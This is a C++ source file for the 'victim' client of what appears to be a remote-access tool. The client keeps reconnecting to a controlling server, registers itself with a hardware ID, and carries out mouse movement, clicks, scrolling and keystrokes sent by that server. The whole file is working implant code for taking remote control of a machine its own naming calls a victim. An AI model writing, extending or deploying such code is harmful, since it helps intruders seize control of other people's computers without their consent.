#include "victim.hpp"
#include <thread>
#include <iostream>
#include <SFML/Window.hpp>
#include <Windows.h>
#include "../commands.hpp"

Victim::Victim(std::string inHId)
	:
	myHId(inHId)
{
}

int Victim::runVictimProcess()
{
	while (!connectServer())
		sf::sleep(sf::seconds(5));

	while (true) {
		sf::Packet p;
		auto status = server.receive(p);

		if (status == sf::Socket::Status::Disconnected) {
			isSshActive = false;
			while (!connectServer())
				sf::sleep(sf::seconds(2));
		}
		if (status != sf::Socket::Status::Done)
			continue;
 
		uint16_t reqId = 0;
		uint8_t cmd;
		p >> reqId >> cmd;

		//start ssh session
		if (cmd == uint8_t(Cmd::START_SSH)) {
			isSshActive = true;
			std::cout << "start ssh\n";
		}
		//end ssh session
		else if (cmd == uint8_t(Cmd::END_SSH)) {
			isSshActive = false;
			std::cout << "stop ssh\n";
		}
		//receive ssh data
		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
			std::string data;
			p >> data;

			std::cout << "data: #" << data << "#\n";

			std::string resStr = "received and processed #" + data + "#\n";
			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << resStr;
			auto _ = server.send(res);
		}
		//receive mouse position data
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_POS)) {
			uint16_t rx, ry;
			p >> rx >> ry;

			auto size = sf::VideoMode::getDesktopMode().size;
			int x = std::round((rx * size.x) / float(UINT16_MAX - 1));
			int y = std::round((ry * size.y) / float(UINT16_MAX - 1));

			SetCursorPos(x, y);
		}
		//receive mouse button press
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_PRESS)) {
			uint8_t i;
			p >> i;

			INPUT in;
			in.type = INPUT_MOUSE;
			in.mi.time = 0;
			in.mi.mouseData = 0;

			if (i == 1)
				in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
			else if (i == 2)
				in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
			else if (i == 3)
				in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
			else if (i == 4 || i == 5)
			{
				in.mi.dwFlags = MOUSEEVENTF_XDOWN;
				if (i == 4)
					in.mi.mouseData = XBUTTON1;
				else
					in.mi.mouseData = XBUTTON2;
			}

			SendInput(1, &in, sizeof(INPUT));
		}
		//receive mouse button release
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_RELEASE)) {
			uint8_t i;
			p >> i;

			INPUT in;
			in.type = INPUT_MOUSE;
			in.mi.time = 0;
			in.mi.mouseData = 0;

			if (i == 1)
					in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
			else if (i == 2)
					in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
			else if (i == 3)
					in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
			else if (i == 4 || i == 5)
			{
				in.mi.dwFlags = MOUSEEVENTF_XUP;
				if (i == 4)
					in.mi.mouseData = XBUTTON1;
				else
					in.mi.mouseData = XBUTTON2;
			}

			SendInput(1, &in, sizeof(INPUT));
		}
		//receive mouse wheel scroll
		else if (cmd == uint8_t(Cmd::SSH_MOUSE_SCROLL)) {
			int16_t delta;
			p >> delta;

			INPUT input;
			input.type = INPUT_MOUSE;
			input.mi.dx = 0;
			input.mi.dy = 0;
			input.mi.mouseData = delta;
			input.mi.dwFlags = MOUSEEVENTF_WHEEL;
			input.mi.time = 0;
			input.mi.dwExtraInfo = 0;

			SendInput(1, &input, sizeof(INPUT));
		}
		//receive keyboard press
		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_PRESS)) {
			uint8_t i;
			p >> i;

			INPUT input;
			input.type = INPUT_KEYBOARD;
			input.ki.wVk = i;
			input.ki.dwFlags = 0;

			SendInput(1, &input, sizeof(INPUT));
		}
		//receive keyboard release
		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD_RELEASE)) {
			uint8_t i;
			p >> i;

			INPUT input;
			input.type = INPUT_KEYBOARD;
			input.ki.wVk = i;
			input.ki.dwFlags = KEYEVENTF_KEYUP;

			SendInput(1, &input, sizeof(INPUT));
		}
		//unknown command
		else {
			std::cerr << "unknown command received: " << int(cmd) << "\n";
			continue;
		}
	}

	return 0;
}

bool Victim::connectServer()
{
	isInitialized = false;
	server.disconnect();

	//connect to the server
	if (server.connect(serverIp, serverPort) != sf::Socket::Status::Done)
		return false;

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	req << reqId << std::uint8_t(Cmd::REGISTER_VICTIM) << std::string("#v0.0.1#") << myHId;
	if (server.send(req) != sf::Socket::Status::Done) {
		server.disconnect();
		return false;
	}

	sf::Packet res;
	bool waiting = true;
	//receive the initialization response
	const auto receive = [this, &waiting, &res, reqId]() {
		while (waiting) {
			res.clear();
			auto _ = server.receive(res);
			uint16_t resId;
			res >> resId;
			if (resId == reqId)
				waiting = false;
		}
	};

	std::thread receiveThread(receive);
	//wait for initialization response
	for (int i = 0; i < 10; i++) {
		sf::sleep(sf::milliseconds(500));
		if (!waiting)
			break;
	}

	if (waiting) {
		waiting = false;
		server.disconnect();
		receiveThread.join();
		return false;
	}
	receiveThread.join();

	bool success = false;
	res >> success;
	if (!success) {
		server.disconnect();
		return false;
	}

	res >> myId;
	isInitialized = true;
	return true;
}
